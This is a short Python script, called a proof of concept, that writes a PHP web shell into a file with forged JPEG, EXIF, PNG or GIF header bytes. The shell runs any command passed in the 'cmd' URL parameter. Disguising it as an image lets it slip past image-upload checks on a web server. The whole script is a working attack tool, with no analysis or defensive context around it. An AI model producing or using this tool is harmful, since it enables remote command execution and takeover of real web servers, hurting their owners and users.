#!/bin/env python
# -*- coding: UTF-8 -*-
#
# prog_name [-t file_format_number] < -o out_file > 

import sys
from optparse import OptionParser

SHELL = """ 
<head>
<title>
simple php shell PoC
</title>
</head>
<body>
<h2>Command Output</h2>
<pre>
<?php
if(isset($_GET['cmd'])){
 $cmd = $_GET['cmd'];
  system($cmd);
   die;
   }
   ?>
</pre>
</body>
</html>
"""

FILE_FORMAT_MAP = {
    '0': 'jpeg',
    '1': 'exif',
    '2': 'png',
    '3': 'gif'
}

SIGNATURE_MAP = {
    'jpeg': ['\xff\xd8\xff\xe0\x00\x10JFIF\x00', '\xff\xd9'],
    'exif': ['\xff\xd8\xff\xe1\x43\x1fExif\x00', '\xff\xd9'],
    'png': '\x89\x50\x4e\x47\x0d\x0a\x1a\x0a',
    'gif': '\x47\x49\x46\x38\x39\x61'
}
   
def return_data(format_key):
    filetype = FILE_FORMAT_MAP.get(format_key)
    signature = SIGNATURE_MAP.get(filetype)
    return signature

def write_file(signature, filename):
    if hasattr(signature, '__iter__'):
        data = signature[0] + SHELL + signature[1]
    else:
        data = signature + SHELL
        
    out_file = open(filename, 'w')
    out_file.write(data)
    out_file.flush()

if __name__ == '__main__':
    # returns a tuple of (options, args)
    parser = OptionParser('Usage: %prog [-t file_format_number] < -o out_file >')
    parser.add_option('-t', '--type', action='store', dest='file_format_key', help='')
    parser.add_option('-o', '--out', action='store', dest='out_filename', help='')
    (options, args) = parser.parse_args()

    signature = return_data(options.file_format_key)
    write_file(signature, options.out_filename)
